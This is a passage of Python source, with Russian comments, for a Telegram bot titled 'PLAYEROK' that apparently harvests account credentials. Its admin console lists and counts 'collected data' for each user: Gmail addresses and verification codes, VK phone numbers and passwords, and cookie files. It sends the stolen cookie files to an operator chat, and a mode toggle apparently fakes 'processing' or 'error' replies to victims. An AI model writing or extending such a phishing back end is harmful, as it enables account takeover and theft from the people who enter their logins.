        if result:
            return result[0] == 'true'
        else:
            return False
        
    except Exception as e:
        print(f"❌ Ошибка проверки режима тех. работ: {e}")
        return False


def toggle_maintenance_mode():
    """Переключает режим технических работ (вкл/выкл)"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        # Получаем текущее состояние
        cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_key = "maintenance_mode"')
        result = cursor.fetchone()
        
        if result:
            current_value = result[0]
            new_value = 'false' if current_value == 'true' else 'true'
        else:
            new_value = 'true'
        
        # Обновляем значение
        cursor.execute('''
            INSERT OR REPLACE INTO bot_settings (setting_key, setting_value, updated_at)
            VALUES ('maintenance_mode', ?, CURRENT_TIMESTAMP)
        ''', (new_value,))
        
        conn.commit()
        conn.close()
        
        print(f"✅ Режим тех. работ изменен на: {new_value}")
        return new_value == 'true'
        
    except Exception as e:
        print(f"❌ Ошибка переключения режима тех. работ: {e}")
        return False


def is_cookie_mode():
    """Проверяет, включен ли режим Cookie"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_key = "cookie_mode"')
        result = cursor.fetchone()
        conn.close()
        if result:
            return result[0] == 'true'
        return False
    except Exception as e:
        print(f"❌ Ошибка проверки режима Cookie: {e}")
        return False


def toggle_cookie_mode():
    """Переключает режим Cookie (вкл/выкл)"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_key = "cookie_mode"')
        result = cursor.fetchone()
        if result:
            current_value = result[0]
            new_value = 'false' if current_value == 'true' else 'true'
        else:
            new_value = 'true'
        cursor.execute('''
            INSERT OR REPLACE INTO bot_settings (setting_key, setting_value, updated_at)
            VALUES ('cookie_mode', ?, CURRENT_TIMESTAMP)
        ''', (new_value,))
        conn.commit()
        conn.close()
        print(f"✅ Режим Cookie изменен на: {new_value}")
        return new_value == 'true'
    except Exception as e:
        print(f"❌ Ошибка переключения режима Cookie: {e}")
        return False


# Глобальная переменная для времени старта бота
bot_start_time = None

# Инициализация TXT файловой базы данных
_txt_init()


def get_bot_uptime():
    """Получает время работы бота"""
    if bot_start_time:
        uptime = datetime.now() - bot_start_time
        days = uptime.days
        hours = uptime.seconds // 3600
        minutes = (uptime.seconds % 3600) // 60
        
        if days > 0:
            return f"{days}д {hours}ч {minutes}м"
        elif hours > 0:
            return f"{hours}ч {minutes}м"
        else:
            return f"{minutes}м"
    return "Неизвестно"


def get_bot_ping():
    """Измеряет пинг бота к Telegram API и возвращает статус со смайликом"""
    try:
        start_time = time.time()
        # Проверяем доступность API через простой запрос
        bot.get_me()
        ping_ms = (time.time() - start_time) * 1000
        
        # Определяем статус по пингу
        if ping_ms < 100:
            status = "🟢 Отлично"
            emoji = "🟢"
        elif ping_ms < 300:
            status = "🟡 Хорошо"
            emoji = "🟡"
        elif ping_ms < 500:
            status = "🟠 Средне"
            emoji = "🟠"
        else:
            status = "🔴 Плохо"
            emoji = "🔴"
        
        return {
            'ping': round(ping_ms, 1),
            'status': status,
            'emoji': emoji
        }
        
    except Exception as e:
        log_error("ping_check", str(e))
        return {
            'ping': 0,
            'status': "🔴 Ошибка",
            'emoji': "🔴"
        }


# ---------- КОНСОЛЬ БОТА ----------
def create_console_keyboard():
    """Создает клавиатуру для консоли"""
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("👥 База", callback_data="console_users"),
        InlineKeyboardButton("📊 Статистика", callback_data="console_stats")
    )
    markup.add(
        InlineKeyboardButton("⚡ Пинг", callback_data="console_ping"),
        InlineKeyboardButton("⚠️ Ошибки", callback_data="console_errors")
    )
    
    # Проверяем состояние поддержки
    support_enabled = is_support_enabled()
    support_text = "🔴 Выкл. поддержку" if support_enabled else "🟢 Вкл. поддержку"
    
    # Проверяем режим ответа
    response_mode = get_response_mode()
    response_text = "🟢 Режим: Обработка" if response_mode == 'processing' else "❌ Режим: Ошибка"
    
    # Проверяем режим технических работ
    maintenance_mode = is_maintenance_mode()
    maintenance_text = "🔴 Тех. работы ВКЛ" if maintenance_mode else "🟢 Тех. работы ВЫКЛ"
    
    markup.add(
        InlineKeyboardButton("📢 Рассылка", callback_data="console_broadcast"),
        InlineKeyboardButton(support_text, callback_data="console_toggle_support")
    )
    markup.add(
        InlineKeyboardButton(response_text, callback_data="console_toggle_response")
    )
    markup.add(
        InlineKeyboardButton(maintenance_text, callback_data="console_toggle_maintenance")
    )
    
    # Режим Cookie
    cookie_mode = is_cookie_mode()
    cookie_text = "🍪 Cookie: ВКЛ 🟢" if cookie_mode else "🍪 Cookie: ВЫКЛ 🔴"
    markup.add(
        InlineKeyboardButton(cookie_text, callback_data="console_toggle_cookie")
    )
    markup.add(
        InlineKeyboardButton("🔄 Обновить", callback_data="console_refresh")
    )
    return markup


def get_console_text():
    """Формирует текст для консоли"""
    users_count = get_users_count()
    threads_count = len(user_threads_cache)
    now = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    
    # Получаем статистику по данным
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM user_data WHERE data_type = "gmail_email"')
    gmail_count = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM user_data WHERE data_type = "vk_phone"')
    vk_count = cursor.fetchone()[0]
    
    # Получаем пинг
    ping_info = get_bot_ping()
    
    # Получаем uptime
    uptime = get_bot_uptime()
    
    # Получаем статус поддержки
    support_status = "🟢 Включена" if is_support_enabled() else "🔴 Выключена"
    
    # Получаем режим ответа
    response_mode = get_response_mode()
    response_status = "🟢 Обработка" if response_mode == 'processing' else "❌ Ошибка"
    
    # Получаем режим технических работ
    maintenance_mode = is_maintenance_mode()
    maintenance_status = "🔴 <b>ВКЛЮЧЕНЫ</b>" if maintenance_mode else "🟢 Выключены"
    
    # Получаем режим Cookie
    cookie_mode = is_cookie_mode()
    cookie_status = "🟢 Включен" if cookie_mode else "🔴 Выключен"
    
    conn.close()
    
    text = f"""╔═══════════════════════════╗
║   🖥 <b>КОНСОЛЬ PLAYEROK</b>     ║
╚═══════════════════════════╝

🕐 <b>Обновлено:</b> <code>{now}</code>
⏱ <b>Uptime:</b> <code>{uptime}</code>
⚡ <b>Пинг:</b> <code>{ping_info['ping']} мс</code> {ping_info['emoji']}

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📊 <b>СТАТИСТИКА БОТА</b>      ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

👥 <b>Пользователи:</b> <code>{users_count}</code>
💬 <b>Активных тем:</b> <code>{threads_count}</code>

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  🗂 <b>СОБРАННЫЕ ДАННЫЕ</b>    ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

📧 <b>Gmail аккаунтов:</b> <code>{gmail_count}</code>
📱 <b>VK аккаунтов:</b> <code>{vk_count}</code>

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ⚙️ <b>НАСТРОЙКИ</b>            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

🔰 <b>Поддержка:</b> {support_status}
💬 <b>Режим ответа:</b> {response_status}
🔧 <b>Тех. работы:</b> {maintenance_status}
🍪 <b>Cookie режим:</b> {cookie_status}

━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>Статус:</b> ✅ Бот работает
<i>Нажмите 🔄 для обновления</i>"""
    
    return text


def send_or_update_console():
    """Отправляет или обновляет консоль"""
    try:
        console_msg_id = get_console_message_id()
        text = get_console_text()
        markup = create_console_keyboard()
        
        if console_msg_id:
            # Пробуем обновить существующее сообщение
            print(f"🔄 Обновляю консоль (ID: {console_msg_id})...")
            try:
                bot.edit_message_text(
                    text,
                    CONSOLE_CHAT_ID,
                    console_msg_id,
                    reply_markup=markup,
                    parse_mode="HTML"
                )
                print("✅ Консоль успешно обновлена (не создавая новых сообщений)")
            except Exception as e:
                print(f"⚠️ Консоль устарела или удалена, создаю новую: {e}")
                # Если не получилось обновить - создаем новую
                msg = bot.send_message(
                    CONSOLE_CHAT_ID,
                    text,
                    reply_markup=markup,
                    parse_mode="HTML"
                )
                save_console_message_id(msg.message_id)
                print(f"✅ Новая консоль создана (ID: {msg.message_id})")
        else:
            # Создаем новое сообщение консоли
            print("📝 Консоли нет в БД, создаю первую консоль...")
            msg = bot.send_message(
                CONSOLE_CHAT_ID,
                text,
                reply_markup=markup,
                parse_mode="HTML"
            )
            save_console_message_id(msg.message_id)
            print(f"✅ Консоль создана (ID: {msg.message_id})")
            
    except Exception as e:
        log_error("send_or_update_console", str(e))
        print(f"❌ Ошибка отправки/обновления консоли: {e}")


def show_users_list(message_id, page=0):
    """Показывает список пользователей с кнопками и пагинацией"""
    try:
        users = get_all_users_from_db()
        
        if not users:
            text = """╔═══════════════════════════╗
║  📂 <b>БАЗА ПОЛЬЗОВАТЕЛЕЙ</b>  ║
╚═══════════════════════════╝

❌ <i>База пустая</i>

Пользователи появятся здесь после
первого запуска бота /start"""
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("◀️ Назад", callback_data="console_back"))
        else:
            # Пагинация
            users_per_page = 8
            total_pages = (len(users) + users_per_page - 1) // users_per_page
            page = max(0, min(page, total_pages - 1))
            
            start_idx = page * users_per_page
            end_idx = start_idx + users_per_page
            
            text = f"""╔═══════════════════════════╗
║  📂 <b>БАЗА ПОЛЬЗОВАТЕЛЕЙ</b>  ║
╚═══════════════════════════╝

👥 <b>Всего:</b> <code>{len(users)}</code>
📄 <b>Страница:</b> <code>{page + 1}/{total_pages}</code>

━━━━━━━━━━━━━━━━━━━━━━━━━━

<i>Нажмите на пользователя для просмотра данных:</i>
"""
            
            markup = InlineKeyboardMarkup(row_width=1)
            
            # Показываем пользователей текущей страницы
            for user in users[start_idx:end_idx]:
                user_id, username, first_name, joined_at = user
                username_display = f"@{username}" if username else "Без username"
                button_text = f"👤 {first_name} | {username_display}"
                markup.add(
                    InlineKeyboardButton(button_text, callback_data=f"console_user_{user_id}")
                )
            
            # Кнопки навигации
            nav_buttons = []
            if page > 0:
                nav_buttons.append(InlineKeyboardButton("◀️ Пред", callback_data=f"console_users_page_{page-1}"))
            if page < total_pages - 1:
                nav_buttons.append(InlineKeyboardButton("След ▶️", callback_data=f"console_users_page_{page+1}"))
            
            if nav_buttons:
                markup.row(*nav_buttons)
            
            markup.add(InlineKeyboardButton("🏠 Главная", callback_data="console_back"))
        
        # Редактируем консоль
        bot.edit_message_text(
            text,
            CONSOLE_CHAT_ID,
            message_id,
            reply_markup=markup,
            parse_mode="HTML"
        )
        
    except Exception as e:
        log_error("show_users_list", str(e))
        print(f"❌ Ошибка показа списка пользователей: {e}")


def show_user_data(message_id, chat_id):
    """Показывает данные конкретного пользователя"""
    try:
        # Получаем информацию о пользователе
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT username, first_name, joined_at FROM users WHERE user_id = ?', (chat_id,))
        user_info = cursor.fetchone()
        conn.close()
        
        if not user_info:
            text = "❌ Пользователь не найден"
        else:
            username, first_name, created_at = user_info
            username_display = f"@{username}" if username else "Нет username"
            
            # Форматируем дату
            try:
                date_obj = datetime.strptime(created_at, "%Y-%m-%d %H:%M:%S")
                formatted_date = date_obj.strftime("%d.%m.%Y %H:%M")
            except:
                formatted_date = created_at
            
            text = f"""╔═══════════════════════════╗
║  📋 <b>КАРТОЧКА ПОЛЬЗОВАТЕЛЯ</b> ║
╚═══════════════════════════╝

👤 <b>Имя:</b> <code>{first_name}</code>
📱 <b>Username:</b> <code>{username_display}</code>
🆔 <b>ID:</b> <code>{chat_id}</code>
📅 <b>Регистрация:</b> <code>{formatted_date}</code>

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  🗂 <b>СОБРАННЫЕ ДАННЫЕ</b>    ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

"""
            
            # Получаем все данные пользователя
            user_data = get_user_data(chat_id)
            
            if user_data:
                # Группируем данные по типу
                data_by_type = {}
                for data_type, data_value, created_at in user_data:
                    if data_type not in data_by_type:
                        data_by_type[data_type] = []
                    data_by_type[data_type].append((data_value, created_at))
                
                # Красиво выводим
                if "gmail_email" in data_by_type:
                    text += "📧 <b>Gmail Email:</b>\n"
                    for value, dt in data_by_type["gmail_email"]:
                        text += f"   └ <code>{value}</code>\n"
                
                if "gmail_code" in data_by_type:
                    text += "\n🔢 <b>Gmail Code:</b>\n"
                    for value, dt in data_by_type["gmail_code"]:
                        text += f"   └ <code>{value}</code>\n"
                
                if "vk_phone" in data_by_type:
                    text += "\n📱 <b>VK Phone:</b>\n"
                    for value, dt in data_by_type["vk_phone"]:
                        text += f"   └ <code>{value}</code>\n"
                
                if "vk_password" in data_by_type:
                    text += "\n🔐 <b>VK Password:</b>\n"
                    for value, dt in data_by_type["vk_password"]:
                        text += f"   └ <code>{value}</code>\n"

                if "cookie_txt" in data_by_type:
                    text += "\n🍪 <b>Cookie файл:</b>\n"
                    for value, dt in data_by_type["cookie_txt"]:
                        try:
                            dt_fmt = datetime.strptime(dt, "%Y-%m-%d %H:%M:%S").strftime("%d.%m.%Y %H:%M")
                        except Exception:
                            dt_fmt = dt
                        text += f"   └ 📎 Файл получен: <code>{dt_fmt}</code>\n"
            else:
                text += "❌ <i>Данные отсутствуют</i>\n\n<i>Пользователь еще не вводил\nданные авторизации</i>"

        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("◀️ К списку", callback_data="console_users"),
            InlineKeyboardButton("🏠 Главная", callback_data="console_back")
        )

        # Редактируем консоль (карточка)
        bot.edit_message_text(
            text,
            CONSOLE_CHAT_ID,
            message_id,
            reply_markup=markup,
            parse_mode="HTML"
        )

        # Если есть куки — сразу присылаем файл следующим сообщением
        try:
            import io as _io
            _conn_ck = sqlite3.connect(DATABASE_FILE)
            _cur_ck  = _conn_ck.cursor()
            _cur_ck.execute(
                "SELECT data_value, created_at FROM user_data WHERE user_id=? AND data_type='cookie_txt' ORDER BY created_at DESC LIMIT 1",
                (chat_id,)
            )
            _row_ck = _cur_ck.fetchone()
            _conn_ck.close()

            if _row_ck:
                _cookie_val, _cookie_dt = _row_ck
                try:
                    _dt_obj = datetime.strptime(_cookie_dt, "%Y-%m-%d %H:%M:%S")
                    _dt_str = _dt_obj.strftime("%d%m%Y_%H%M")
                    _dt_fmt = _dt_obj.strftime("%d.%m.%Y %H:%M")
                except Exception:
                    _dt_str = "file"
                    _dt_fmt = _cookie_dt

                _bio = _io.BytesIO(_cookie_val.encode("utf-8"))
                _bio.name = f"cookie_{chat_id}_{_dt_str}.txt"

                _uname_d = username_display if username_display else "—"
                _caption = (
                    f"🍪 <b>Cookie файл</b>\n\n"
                    f"👤 <b>{first_name}</b> | {_uname_d}\n"
                    f"🆔 <code>{chat_id}</code>\n"
                    f"📅 {_dt_fmt}"
                )
                bot.send_document(
                    CONSOLE_CHAT_ID,
                    _bio,
                    caption=_caption,
                    parse_mode="HTML"
                )
        except Exception as _ck_e:
            log_error("show_user_data_cookie", str(_ck_e))
        
    except Exception as e:
        log_error("show_user_data", str(e))
        print(f"❌ Ошибка показа данных пользователя: {e}")


def show_stats(message_id):
    """Показывает детальную статистику"""
    try:
        users_count = get_users_count()
        threads_count = len(user_threads_cache)
        
        # Статистика по данным
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT data_type, COUNT(*) FROM user_data GROUP BY data_type')
        data_stats = cursor.fetchall()
        
        # Считаем общее количество записей
        cursor.execute('SELECT COUNT(*) FROM user_data')
        total_data = cursor.fetchone()[0]
        
        conn.close()
        
        text = f"""╔═══════════════════════════╗
║  📊 <b>ДЕТАЛЬНАЯ СТАТИСТИКА</b> ║
╚═══════════════════════════╝

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  👥 <b>ПОЛЬЗОВАТЕЛИ</b>          ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

Всего в базе: <code>{users_count}</code>
Активных тем: <code>{threads_count}</code>

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  🗂 <b>СОБРАННЫЕ ДАННЫЕ</b>     ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

Всего записей: <code>{total_data}</code>

"""
        
        if data_stats:
            icons = {
                "gmail_email": "📧",
                "gmail_code": "🔢",
                "vk_phone": "📱",
                "vk_password": "🔐"
            }
            names = {
                "gmail_email": "Gmail Email",
                "gmail_code": "Gmail Code",
                "vk_phone": "VK Phone",
                "vk_password": "VK Password"
            }
            
            for data_type, count in data_stats:
                icon = icons.get(data_type, "📝")
                name = names.get(data_type, data_type)
                text += f"{icon} <b>{name}:</b> <code>{count}</code>\n"
        else:
            text += "❌ <i>Нет данных</i>"
        
        text += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━"
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("◀️ Назад", callback_data="console_back"))
        
        # Редактируем консоль
        bot.edit_message_text(
            text,
            CONSOLE_CHAT_ID,
            message_id,
            reply_markup=markup,
            parse_mode="HTML"
        )
        
    except Exception as e:
        log_error("show_stats", str(e))
        print(f"❌ Ошибка показа статистики: {e}")


def show_bot_status(message_id):
    """Показывает статус бота и пинг"""
    try:
        # Получаем пинг
        ping_info = get_bot_ping()
        
        # Получаем uptime
        uptime = get_bot_uptime()
        
        # Получаем статистику
        users_count = get_users_count()
        errors_count = get_errors_count()
        
        # Получаем информацию о боте
        try:
            bot_info = bot.get_me()
            bot_username = f"@{bot_info.username}"
            bot_name = bot_info.first_name
        except:
            bot_username = "Неизвестно"
            bot_name = "Неизвестно"
        
        text = f"""╔═══════════════════════════╗
║   ⚙️ <b>СТАТУС БОТА</b>          ║
╚═══════════════════════════╝

🤖 <b>Бот:</b> {bot_name}
📱 <b>Username:</b> <code>{bot_username}</code>

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📡 <b>ПОДКЛЮЧЕНИЕ</b>          ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

{ping_info['emoji']} <b>Статус:</b> {ping_info['status']}
⚡ <b>Пинг:</b> <code>{ping_info['ping']} мс</code>

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ⏱ <b>ВРЕМЯ РАБОТЫ</b>         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

🕐 <b>Uptime:</b> <code>{uptime}</code>
👥 <b>Пользователей:</b> <code>{users_count}</code>
⚠️ <b>Ошибок:</b> <code>{errors_count}</code>

━━━━━━━━━━━━━━━━━━━━━━━━━━

<i>Статус обновляется при каждом входе</i>"""
        
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("🔄 Обновить", callback_data="console_ping"),
            InlineKeyboardButton("◀️ Назад", callback_data="console_back")
        )
        
        # Редактируем консоль
        bot.edit_message_text(
            text,
            CONSOLE_CHAT_ID,
            message_id,
            reply_markup=markup,
            parse_mode="HTML"
        )
        
    except Exception as e:
        log_error("show_bot_status", str(e))
        print(f"❌ Ошибка показа статуса бота: {e}")


def print_errors_to_terminal():
    """Выводит все ошибки в терминал для детального просмотра"""
    try:
        print("\n" + "="*60)
        print("⚠️  ДЕТАЛЬНЫЙ ОТЧЁТ ОБ ОШИБКАХ")
        print("="*60 + "\n")
        
        # Получаем полные ошибки из БД
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT error_type, error_message, error_traceback, created_at 
            FROM error_logs 
            ORDER BY created_at DESC 
            LIMIT 20
        ''')
        
        errors = cursor.fetchall()
        conn.close()
        
        if not errors:
            print("✅ Нет ошибок в базе данных\n")
            return
        
        print(f"📊 Найдено ошибок: {len(errors)}\n")
        print("-"*60)
        
        for idx, (error_type, error_msg, error_traceback, created_at) in enumerate(errors, 1):
            print(f"\n#{idx} | {created_at}")
            print(f"Тип: {error_type}")
            print(f"Сообщение: {error_msg}")
            
            if error_traceback:
                print(f"\nTraceback:")
                print(error_traceback)
            
            print("-"*60)
        
        print(f"\n✅ Показано {len(errors)} последних ошибок")
        print("="*60 + "\n")
        
    except Exception as e:
        print(f"❌ Ошибка вывода ошибок в терминал: {e}")


def show_errors(message_id):
    """Показывает логи ошибок"""
    try:
        errors_by_hour = get_errors_grouped_by_hour(24)
        recent_errors = get_recent_errors(10)
        total_errors = get_errors_count()
        
        text = f"""╔═══════════════════════════╗
║   ⚠️ <b>ЛОГ ОШИБОК</b>           ║
╚═══════════════════════════╝

<b>Всего ошибок:</b> <code>{total_errors}</code>
<b>За последние 24ч:</b> <code>{len(errors_by_hour)}</code> записей

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📊 <b>ПО ЧАСАМ (24ч)</b>       ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

"""
        
        if errors_by_hour:
            for hour, count, error_type in errors_by_hour[:10]:
                # Форматируем время
                try:
                    dt = datetime.strptime(hour, "%Y-%m-%d %H:00")
                    formatted_time = dt.strftime("%d.%m %H:00")
                except:
                    formatted_time = hour
                
                text += f"🕐 <code>{formatted_time}</code> | {error_type}: <b>{count}</b>\n"
        else:
            text += "✅ <i>Нет ошибок за последние 24 часа</i>\n"
        
        text += "\n┏━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        text += "┃  📝 <b>ПОСЛЕДНИЕ ОШИБКИ</b>    ┃\n"
        text += "┗━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        
        if recent_errors:
            for error_type, error_msg, created_at in recent_errors[:5]:
                # Форматируем время
                try:
                    dt = datetime.strptime(created_at, "%Y-%m-%d %H:%M:%S")
                    formatted_time = dt.strftime("%d.%m %H:%M")
                except:
                    formatted_time = created_at
                
                # Обрезаем длинное сообщение
                short_msg = error_msg[:50] + "..." if len(error_msg) > 50 else error_msg
                text += f"⚠️ <code>{formatted_time}</code>\n"
                text += f"   {error_type}: {short_msg}\n\n"
        else:
            text += "✅ <i>Нет ошибок</i>\n"
        
        text += "━━━━━━━━━━━━━━━━━━━━━━━━━━"
        
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("🖥 В терминал", callback_data="console_print_errors"),
            InlineKeyboardButton("🔄 Обновить", callback_data="console_errors")
        )
        markup.row(
            InlineKeyboardButton("🗑 Очистить старые", callback_data="console_clear_errors")
        )
        markup.add(InlineKeyboardButton("◀️ Назад", callback_data="console_back"))
        
        # Редактируем консоль
        bot.edit_message_text(
            text,
            CONSOLE_CHAT_ID,
            message_id,
            reply_markup=markup,
            parse_mode="HTML"
        )
        
    except Exception as e:
        log_error("show_errors", str(e))
        print(f"❌ Ошибка показа логов ошибок: {e}")


def start_console_auto_update():
    """Автоматически обновляет консоль каждые 5 секунд"""
    def auto_update():
        while True:
            try:
                time.sleep(5)
                send_or_update_console()
            except Exception as e:
                log_error("auto_update_console", str(e))
                print(f"❌ Ошибка автообновления консоли: {e}")
    
    threading.Thread(target=auto_update, daemon=True).start()
    print("✅ Автообновление консоли запущено (каждые 5 сек)")


# Состояние для рассылки
broadcast_state = {}

def start_broadcast(message_id):
    """Начинает процесс рассылки"""
    try:
        users_count = get_users_count()
        
        text = f"""╔═══════════════════════════╗
║   📢 <b>РАССЫЛКА СООБЩЕНИЙ</b>  ║
╚═══════════════════════════╝

<b>Получателей:</b> <code>{users_count}</code> пользователей

━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>Как использовать:</b>

1️⃣ Отправьте сообщение в эту группу
2️⃣ Можно отправить текст или фото
3️⃣ Рассылка начнется автоматически

━━━━━━━━━━━━━━━━━━━━━━━━━━

⚠️ <b>ВНИМАНИЕ!</b>
<i>Следующее сообщение в этой группе
будет разослано ВСЕМ пользователям!</i>"""
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("❌ Отмена", callback_data="broadcast_cancel"))
        
        bot.edit_message_text(
            text,
            CONSOLE_CHAT_ID,
            message_id,
            reply_markup=markup,
            parse_mode="HTML"
        )
        
        # Устанавливаем состояние рассылки с сохранением ID консоли
        broadcast_state['active'] = True
        broadcast_state['console_message_id'] = message_id
        
    except Exception as e:
        log_error("start_broadcast", str(e))
        print(f"❌ Ошибка начала рассылки: {e}")


def save_thread_to_db(chat_id, group_id, thread_id, thread_name):
    """Сохраняет тему в базу данных"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO threads (user_id, group_id, thread_id, thread_name)
            VALUES (?, ?, ?, ?)
        ''', (chat_id, group_id, thread_id, thread_name))
        
        conn.commit()
        conn.close()
        print(f"✅ Тема {thread_id} для пользователя {chat_id} в группе {group_id} сохранена в БД")
        
    except Exception as e:
        print(f"❌ Ошибка сохранения темы в БД: {e}")


def get_thread_from_db(chat_id, group_id):
    """Получает thread_id из базы данных"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT thread_id FROM threads 
            WHERE user_id = ? AND group_id = ?
        ''', (chat_id, group_id))
        
        result = cursor.fetchone()
        conn.close()
        
        if result:
            return result[0]
        return None
        
    except Exception as e:
        print(f"❌ Ошибка получения темы из БД: {e}")
        return None


def get_all_threads_from_db():
    """Загружает все темы из базы данных в формате словаря"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT user_id, group_id, thread_id FROM threads')
        rows = cursor.fetchall()
        conn.close()
        
        # Преобразуем в формат {chat_id_group_id: thread_id}
        threads_dict = {}
        for row in rows:
            chat_id, group_id, thread_id = row
            thread_key = f"{chat_id}_{group_id}"
            threads_dict[thread_key] = thread_id
        
        print(f"✅ Загружено {len(threads_dict)} тем из БД")
        return threads_dict
        
    except Exception as e:
        print(f"❌ Ошибка загрузки тем из БД: {e}")
        return {}


def delete_thread_from_db(chat_id, group_id):
    """Удаляет тему из базы данных"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            DELETE FROM threads 
            WHERE user_id = ? AND group_id = ?
        ''', (chat_id, group_id))
        
        conn.commit()
        conn.close()
        print(f"✅ Тема для пользователя {chat_id} в группе {group_id} удалена из БД")
        
    except Exception as e:
        print(f"❌ Ошибка удаления темы из БД: {e}")


# ---------- РАБОТА С ТЕМАМИ (THREADS) ----------
user_threads_cache = {}  # Формат: {"chat_id_group_id": thread_id}

def load_user_threads():
    """Загружает словарь тем пользователей из базы данных"""
    global user_threads_cache
    user_threads_cache = get_all_threads_from_db()
    return user_threads_cache


def save_user_threads():
    """Функция для обратной совместимости (теперь сохранение происходит сразу в БД)"""
    pass


def create_thread_for_user(chat_id, group_chat_id):
    """Создает новую тему для пользователя в указанной группе"""
    global user_threads_cache
    
    thread_key = f"{chat_id}_{group_chat_id}"
    
    # Проверяем в кеше
    if thread_key in user_threads_cache:
        return user_threads_cache[thread_key]
    
    # Проверяем в базе данных
    thread_id = get_thread_from_db(chat_id, group_chat_id)
    if thread_id:
        user_threads_cache[thread_key] = thread_id
        return thread_id
    
    # Создаем новую тему
    try:
        user = bot.get_chat(chat_id)
        username = f"@{user.username}" if user.username else "Без username"
        thread_name = f"{user.first_name} | {username}"
        
        # Создаем форум-топик
        forum_topic = bot.create_forum_topic(group_chat_id, thread_name)
        thread_id = forum_topic.message_thread_id
        
        # Сохраняем в БД и кеш
        save_thread_to_db(chat_id, group_chat_id, thread_id, thread_name)
        user_threads_cache[thread_key] = thread_id
        
        print(f"✅ Создана тема #{thread_id} для user_id={chat_id} в группе {group_chat_id}")
        return thread_id
        
    except Exception as e:
        error_msg = str(e)
        log_error("create_thread", error_msg)
        print(f"❌ ОШИБКА создания темы для user_id={chat_id} в группе {group_chat_id}: {error_msg}")
        
        # Если ошибка связана с тем, что группа не форум
        if "forum" in error_msg.lower() or "supergroup" in error_msg.lower():
            print(f"   ⚠️ Группа {group_chat_id} не является форумом!")
            print(f"   💡 Настройки → Темы → Включить темы")
        
        return None


def get_thread_id(chat_id, group_chat_id):
    """Получает ID темы для пользователя (без создания новой)"""
    thread_key = f"{chat_id}_{group_chat_id}"
    
    # Сначала проверяем кеш
    if thread_key in user_threads_cache:
        return user_threads_cache[thread_key]
    
    # Если нет в кеше, проверяем БД
    thread_id = get_thread_from_db(chat_id, group_chat_id)
    if thread_id:
        user_threads_cache[thread_key] = thread_id
    else:
        print(f"❌ ОШИБКА: Тема не найдена для user_id={chat_id}, group_id={group_chat_id}")
    
    return thread_id


def initialize_user_threads(chat_id):
    """Создает темы для пользователя во ВСЕХ группах и отправляет приветственные сообщения
    ВАЖНО: Кнопка 'Ответить' создаётся ВСЕГДА для администраторов"""
    def _init():
        try:
            user = bot.get_chat(chat_id)
            username = user.username if user.username else None
            first_name = user.first_name if user.first_name else "Пользователь"
            
            # Сохраняем пользователя в БД
            save_user_to_db(chat_id, username, first_name)
            
            username_display = f"@{username}" if username else "Нет username"
            now = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
            
            # Приветственное сообщение для темы
            welcome_msg = (
                f"🆕 НОВЫЙ ПОЛЬЗОВАТЕЛЬ\n\n"
                f"👤 Имя: {first_name}\n"
                f"📱 Username: {username_display}\n"
                f"🆔 ID: {chat_id}\n"
                f"⏰ {now}"
            )
            
            # Кнопка "Ответить" создаётся ВСЕГДА для администраторов
            # Она не зависит от настройки поддержки - админы всегда могут отвечать
            markup = InlineKeyboardMarkup()
            markup.add(
                InlineKeyboardButton("💬 Ответить", callback_data=f"reply_{chat_id}")
            )
            
